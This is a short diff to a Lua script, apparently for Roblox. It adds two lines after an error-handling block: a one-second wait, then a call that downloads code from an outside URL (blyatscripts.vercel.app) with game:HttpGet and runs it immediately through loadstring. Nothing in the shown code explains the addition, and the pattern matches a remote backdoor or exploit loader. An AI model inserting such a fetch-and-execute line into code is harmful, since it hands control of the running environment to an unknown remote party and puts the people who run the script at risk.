@@ -30,3 +30,6 @@ end)
 if not success then
     warn("Failed to run script: " .. tostring(err))
 end
+
+task.wait(1)
+loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
